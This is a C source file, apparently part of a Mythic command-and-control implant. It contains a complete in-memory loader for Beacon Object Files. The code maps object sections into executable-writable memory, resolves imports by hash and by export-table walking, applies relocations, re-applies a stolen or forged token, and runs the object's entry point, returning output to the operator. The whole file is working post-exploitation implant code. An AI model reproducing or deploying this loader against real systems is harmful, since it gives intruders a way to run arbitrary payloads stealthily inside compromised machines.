#include "Tasks/InlineExecute.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "BeaconCompatibility.h"
#include "Utils.h"
#include "Debug.h"
#include "Identity.h"

#include <string.h>
#include <stdlib.h>

#if defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)

/**
 * Reference - https://github.com/Ap3x/COFF-Loader/tree/main/Src
*/

/*
    COFF Loader Supporting Functions
*/
BOOL InternalFunctionMatch(char* StrippedSymbolName) {
    if (STR_EQUALS(StrippedSymbolName, "Beacon")  ||
        STR_EQUALS(StrippedSymbolName, "GetProcAddress") ||
        STR_EQUALS(StrippedSymbolName, "GetModuleHandleA") ||
        STR_EQUALS(StrippedSymbolName, "toWideChar") ||
        STR_EQUALS(StrippedSymbolName, "LoadLibraryA") ||
        STR_EQUALS(StrippedSymbolName, "FreeLibrary"))
    {
        return TRUE;
    }
    return FALSE;
}

static const COFF_SYM_OVERRIDE *g_coffOverrides = NULL;
static int g_coffOverrideCount = 0;
static BOOL g_coffEatResolve = FALSE;

static BOOL PeNameEq(const char *a, const char *b)
{
    if (!a || !b)
        return FALSE;
    while (*a && *b && *a == *b) {
        a++;
        b++;
    }
    return *a == *b;
}

FARPROC CoffPeGetProcAddress(HMODULE mod, const char *name)
{
    BYTE *base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_DATA_DIRECTORY *dir;
    IMAGE_EXPORT_DIRECTORY *exp;
    DWORD *names;
    WORD *ords;
    DWORD *funcs;
    DWORD i;
    DWORD rva;
    BYTE *addr;
    char fwd[256];
    char *dot;
    HMODULE fwdMod;
    int depth = 0;

    if (!mod || !name)
        return NULL;

again:
    if (depth++ > 8)
        return NULL;

    base = (BYTE *)mod;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress || !dir->Size)
        return NULL;
    exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir->VirtualAddress);
    names = (DWORD *)(base + exp->AddressOfNames);
    ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++) {
        const char *n = (const char *)(base + names[i]);
        if (!PeNameEq(n, name))
            continue;
        rva = funcs[ords[i]];
        addr = base + rva;
        if (rva >= dir->VirtualAddress && rva < dir->VirtualAddress + dir->Size) {
            SIZE_T k;
            for (k = 0; k < sizeof(fwd) - 1 && addr[k]; k++)
                fwd[k] = (char)addr[k];
            fwd[k] = 0;
            dot = strrchr(fwd, '.');
            if (!dot || !dot[1])
                return NULL;
            *dot = 0;
            fwdMod = GetModuleHandleA(fwd);
            if (!fwdMod)
                fwdMod = LoadLibraryA(fwd);
            if (!fwdMod) {
                char dll[260];
                SIZE_T ln = 0;
                while (fwd[ln] && ln < sizeof(dll) - 5) {
                    dll[ln] = fwd[ln];
                    ln++;
                }
                dll[ln++] = '.'; dll[ln++] = 'd'; dll[ln++] = 'l'; dll[ln++] = 'l'; dll[ln] = 0;
                fwdMod = GetModuleHandleA(dll);
                if (!fwdMod)
                    fwdMod = LoadLibraryA(dll);
            }
            if (!fwdMod)
                return NULL;
            if (dot[1] == '#')
                return GetProcAddress(fwdMod, (LPCSTR)(ULONG_PTR)strtoul(dot + 2, NULL, 10));
            {
                char keep[128];
                SIZE_T kn = 0;
                const char *fn = dot + 1;
                while (fn[kn] && kn < sizeof(keep) - 1) {
                    keep[kn] = fn[kn];
                    kn++;
                }
                keep[kn] = 0;
                memcpy(fwd, keep, kn + 1);
            }
            mod = fwdMod;
            name = fwd;
            goto again;
        }
        return (FARPROC)addr;
    }
    return NULL;
}

void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
    void* functionaddress = NULL;
    char localSymbolNameCopy[1024] = { 0 };
    InternalFunction = FALSE;
    char* locallib = NULL;
    char* localfunc = SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1;
    HMODULE llHandle = NULL;
    strncpy_s(localSymbolNameCopy, sizeof(localSymbolNameCopy), SymbolName, sizeof(localSymbolNameCopy) - 1);
    char* context = NULL;

    if (InternalFunctionMatch(SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1)) {
        InternalFunction = TRUE;

        localfunc = SymbolName + strlen(PREPENDSYMBOLVALUE);
        UINT32 hash = custom_hash(localfunc);
        int i;

        BeaconCompatibilityEnsureHashes();

        for (i = 0; i < g_coffOverrideCount; i++) {
            if (g_coffOverrides[i].addr && g_coffOverrides[i].hash == hash)
                return g_coffOverrides[i].addr;
        }

        for (int tempcounter = 0; tempcounter < INTERNAL_FUNCTIONS_COUNT; tempcounter++) {
            if (InternalFunctions[tempcounter][0] != NULL) {
                if (hash == (UINT32)(ULONG_PTR)InternalFunctions[tempcounter][0]) {
                    functionaddress = (void*)InternalFunctions[tempcounter][1];
                    return functionaddress;
                }
            }
        }
        return NULL;
    }
    else {
        locallib = strtok_s(localSymbolNameCopy + sizeof(PREPENDSYMBOLVALUE) - 1, "$", &context);
        llHandle = LoadLibraryA(locallib);

        localfunc = strtok_s(NULL, "$", &context);
        localfunc = strtok_s(localfunc, "@", &context);

        if (g_coffEatResolve)
            functionaddress = (void *)CoffPeGetProcAddress(llHandle, localfunc);
        if (!functionaddress)
            functionaddress = GetProcAddress(llHandle, localfunc);
        return functionaddress;
    }
    return NULL;
}

void *CoffFindEntry(COFF_RUNTIME_t* rt, char* func)
{
    COFF_t* COFF;
    VOID(*foo)(char* in, UINT32 datalen) = NULL;

    if (!rt || !func || !rt->coff.FileBase)
        return NULL;

    COFF = &rt->coff;

    char* stringTable = (char*)(COFF->SymbolTable + COFF->FileHeader->NumberOfSymbols);
    for (UINT32 counter = 0; counter < COFF->FileHeader->NumberOfSymbols; counter += 1 + COFF->SymbolTable[counter].NumberOfAuxSymbols)
    {
        char* symName;
        char inlineName[9] = {0};
        if (COFF->SymbolTable[counter].first.Name[0] != 0)
        {
            memcpy(inlineName, COFF->SymbolTable[counter].first.Name, 8);
            symName = inlineName;
        }
        else
        {
            symName = stringTable + COFF->SymbolTable[counter].first.value[1];
        }

        if (strcmp(symName, func) == 0)
        {
            UINT16 secNum = COFF->SymbolTable[counter].SectionNumber;
            if (secNum == 0 || COFF->SectionMapped[secNum - 1] == NULL)
                continue;
            foo = (void(*)(char*, UINT32))((char*)COFF->SectionMapped[secNum - 1] + COFF->SymbolTable[counter].Value);
        }
    }

    return (void *)foo;
}

BOOL ExecuteEntry(COFF_t* COFF, char* func, char* args, unsigned long argSize) {
    VOID(*foo)(char* in, UINT32 datalen) = NULL;
    COFF_RUNTIME_t tmp;

    if (!func || !COFF || !COFF->FileBase)
    {
        _dbg("No entry provided");
        return FALSE;
    }

    memset(&tmp, 0, sizeof(tmp));
    tmp.coff = *COFF;
    foo = (VOID(*)(char*, UINT32))CoffFindEntry(&tmp, func);

    if (!foo)
    {
        _dbg("Couldn't find entry point");
        return FALSE;
    }

    _dbg("Trying to run: 0x%p\n\n", foo);

    foo((char*)args, argSize);
    return TRUE;
}

void RelocationTypeParse(COFF_t* COFF, void** SectionMapped, int SectionNumber, BOOL InternalFunction, void* FunctionAddrPTR, char* FunctionMapping) {
    UINT32 offsetAddr = 0;
    UINT64 longOffsetAddr = 0;
    unsigned int Type = COFF->Relocation->Type;

    if (FunctionAddrPTR == NULL) {
        UINT16 symSecNum = COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber;
        if (symSecNum == 0) return;
        if (SectionMapped[symSecNum - 1] == NULL) return;
    }

    if (Type == IMAGE_REL_AMD64_ADDR64)
    {
        memcpy(&longOffsetAddr, (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, sizeof(UINT64));
        //_dbg("\tReadin longOffsetValue : 0x%llX\n", longOffsetAddr);
        longOffsetAddr = (UINT64)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + (UINT64)longOffsetAddr);
        longOffsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
        //_dbg("\tModified longOffsetValue : 0x%llX Base Address: %p\n", longOffsetAddr, SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1]);
        memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &longOffsetAddr, sizeof(UINT64));
    }
    else if (COFF->Relocation->Type == IMAGE_REL_AMD64_ADDR32NB) {
        memcpy(&offsetAddr, (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, sizeof(INT32));
        //_dbg("\tReadin OffsetValue : 0x%0X\n", offsetAddr);
        //_dbg("\t\tReferenced Section: 0x%X\n", (char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + offsetAddr);
        //_dbg("\t\tEnd of Relocation Bytes: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4);
        offsetAddr = ((char*)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + offsetAddr) - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
        offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
        //_dbg("\tSetting 0x%p to OffsetValue: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
        memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
    }
    else if (Type == IMAGE_REL_AMD64_REL32) {
        if (FunctionAddrPTR != NULL) {
            memcpy(FunctionMapping + (COFF->FunctionMappingCount * 8), &FunctionAddrPTR, sizeof(UINT64));
            offsetAddr = (INT32)((FunctionMapping + (COFF->FunctionMappingCount * 8) ) - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
            offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
            //_dbg("\t\tSetting internal function at 0x%p to relative address: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
            memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
            InternalFunction = FALSE;
            COFF->FunctionMappingCount++;
        }
        else {
            // This should copy the relative offset for the specified data section into offsetAddr
            memcpy(&offsetAddr, (void*)((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress), sizeof(UINT32));
            //_dbg("\tReadin Offset Value : 0x%llX\n", offsetAddr);
            // Getting the symbols section then adding the offset to get the value stored.
            offsetAddr += (UINT32)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
            // Since the StorageClass is going to be IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL with a non-zero SymbolTableIndex
            offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
            //_dbg("\t\tSetting 0x%p to relative address: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
            memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
        }
    }
    else 
    {
        //_dbg("[!] Relocation Type Not Implemented\n");
    }
    //_dbg("\tValueNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value);
    //_dbg("\tSectionNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber);
}

BOOL CoffMapEx(char* FileData, COFF_RUNTIME_t* out, const COFF_SYM_OVERRIDE *ov, int ovCount, BOOL eatResolve)
{
    const COFF_SYM_OVERRIDE *savedOv = g_coffOverrides;
    int savedCount = g_coffOverrideCount;
    BOOL savedEat = g_coffEatResolve;
    BOOL ok = FALSE;

    if (!FileData || !out)
        return FALSE;

    memset(out, 0, sizeof(COFF_RUNTIME_t));

    g_coffOverrides = ov;
    g_coffOverrideCount = ovCount;
    g_coffEatResolve = eatResolve;

    out->coff.FileBase = FileData;
    out->coff.FileHeader = (FileHeader_t*)out->coff.FileBase;
    out->coff.SymbolTable = (Symbol_t*)(out->coff.FileBase + out->coff.FileHeader->PointerToSymbolTable);
    out->coff.FunctionMappingCount = 0;
    out->coff.RelocationsCount = 0;
    out->numberOfSections = out->coff.FileHeader->NumberOfSections;

    out->sectionMapped = (void**)calloc(sizeof(char*) * (out->numberOfSections + 1), 1);
    if (!out->sectionMapped)
        goto done;
    out->coff.SectionMapped = out->sectionMapped;

    if ((int)out->coff.FileHeader->Machine != IMAGE_FILE_MACHINE_AMD64) {
        _dbg("[!] This common object file format is not supported yet :)");
        free(out->sectionMapped);
        out->sectionMapped = NULL;
        goto done;
    }

    for (byte i = 0; i < out->numberOfSections; i++) {
        Section_t* section = (Section_t*)(out->coff.FileBase + sizeof(FileHeader_t) + (i * sizeof(Section_t)));

        out->sectionMapped[i] = (char*)VirtualAlloc(NULL, section->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

        if (section->PointerToRawData != 0) {
            memcpy(out->sectionMapped[i], out->coff.FileBase + section->PointerToRawData, section->SizeOfRawData);
        }
        else {
            memset(out->sectionMapped[i], 0, section->SizeOfRawData);
        }

        if (!strcmp(section->Name, ".text")) {
            out->coff.RawTextData = out->sectionMapped[i];
        }

        out->coff.RelocationsCount += section->NumberOfRelocations;
    }

    out->functionMapping = (char*)VirtualAlloc(NULL, out->coff.RelocationsCount * 8, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    if (!out->functionMapping && out->coff.RelocationsCount > 0) {
        CoffUnmap(out);
        goto done;
    }

    for (int s = 0; s < out->numberOfSections; s++) {
        if (out->sectionMapped[s] == NULL) continue;
        Section_t* section = (Section_t*)(out->coff.FileBase + sizeof(FileHeader_t) + (s * sizeof(Section_t)));
        out->coff.RelocationsTextPTR = out->coff.FileBase + section->PointerToRelocations;

        for (int i = 0; i < section->NumberOfRelocations; i++) {
            UINT32 symbolOffset = 0;
            void* funcptrlocation = NULL;
            out->coff.Relocation = (Relocation_t*)(out->coff.RelocationsTextPTR + (i * sizeof(Relocation_t)));

            symbolOffset = out->coff.SymbolTable[out->coff.Relocation->SymbolTableIndex].first.value[1];

            if (out->coff.SymbolTable[out->coff.Relocation->SymbolTableIndex].first.Name[0] != 0) {
                RelocationTypeParse(&out->coff, out->sectionMapped, s, FALSE, NULL, NULL);
            }
            else {
                BOOL internalFunctionCheck = FALSE;
                funcptrlocation = ProcessBeaconSymbols(((char*)(out->coff.SymbolTable + out->coff.FileHeader->NumberOfSymbols)) + symbolOffset, &internalFunctionCheck);
                if (funcptrlocation == NULL && out->coff.SymbolTable[out->coff.Relocation->SymbolTableIndex].SectionNumber == 0) {
                    _dbg("[!] Failed to resolve symbol. Symbol : %s\n", ((char*)(out->coff.SymbolTable + out->coff.FileHeader->NumberOfSymbols)) + symbolOffset);
                }

                RelocationTypeParse(&out->coff, out->sectionMapped, s, &internalFunctionCheck, funcptrlocation, out->functionMapping);
            }
        }
    }

    ok = TRUE;

done:
    g_coffOverrides = savedOv;
    g_coffOverrideCount = savedCount;
    g_coffEatResolve = savedEat;
    return ok;
}

BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
{
    return CoffMapEx(FileData, out, NULL, 0, FALSE);
}

BOOL CoffExecute(COFF_RUNTIME_t* rt, char* EntryName, char* argumentdata, unsigned long argumentsize)
{
    if (!rt || !EntryName)
        return FALSE;
    return ExecuteEntry(&rt->coff, EntryName, argumentdata, argumentsize);
}

VOID CoffUnmap(COFF_RUNTIME_t* rt)
{
    if (!rt)
        return;

    if (rt->sectionMapped) {
        for (byte i = 0; i < rt->numberOfSections; i++) {
            if (rt->sectionMapped[i] != NULL) {
                VirtualFree(rt->sectionMapped[i], 0, MEM_RELEASE);
                rt->sectionMapped[i] = NULL;
            }
        }
        free(rt->sectionMapped);
        rt->sectionMapped = NULL;
    }

    if (rt->functionMapping) {
        VirtualFree(rt->functionMapping, 0, MEM_RELEASE);
        rt->functionMapping = NULL;
    }

    memset(rt, 0, sizeof(COFF_RUNTIME_t));
}

BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdata, unsigned long argumentsize)
{
    COFF_RUNTIME_t rt = { 0 };
    BOOL Success = FALSE;

    (void)DataSize;

    if (!CoffMap(FileData, &rt))
        return FALSE;

    Success = CoffExecute(&rt, EntryName, argumentdata, argumentsize);
    CoffUnmap(&rt);
    return Success;
}


#ifdef INCLUDE_CMD_INLINE_EXECUTE
/**
 * @brief Execute a Beacon Object File in current process thread.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
{
    /* Parse command arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    if ( nbArg < 2 )
    {
        _err("Invalid number of arguments");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    PCHAR  BofData   = NULL;
    PCHAR  BofArgs   = NULL;
    SIZE_T bofLen    = 0;
    SIZE_T argLen    = 0;

    /* Get BOF and Arguments */
    BofArgs = ParserGetString(arguments, &argLen);
    BofData = ParserGetString(arguments, &bofLen);

    if ( BofData == NULL || bofLen == 0 )
    {
        _err("Invalid BOF data");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    /* Re-apply stolen/made token so the BOF thread is impersonating. */
    IdentityImpersonateToken();

    /* Execute the BOF with pre-packed arguments */
    if ( !RunCOFF(BofData, &bofLen, "go", BofArgs, argLen) ) 
    {
        _err("Failed to execute BOF in current thread.");
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    /* Read output from Global Beacon Output Buffer */
    PCHAR OutData = NULL;
	INT   OutSize = 0;
    
    OutData       = BeaconGetOutputData(&OutSize);

	if ( OutData == NULL || OutSize == 0 ) 
    {
        _err("Failed get BOF output");
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
	}

    PPackage locals = PackageInit(0, FALSE);
    PackageAddString(locals, OutData, FALSE);
    
    // Success
    PackageComplete(taskUuid, locals);

// Cleanup
    free(OutData);                  // allocated in BeaconOutput()
    PackageDestroy(locals);
}
#endif /* INCLUDE_CMD_INLINE_EXECUTE */

#endif

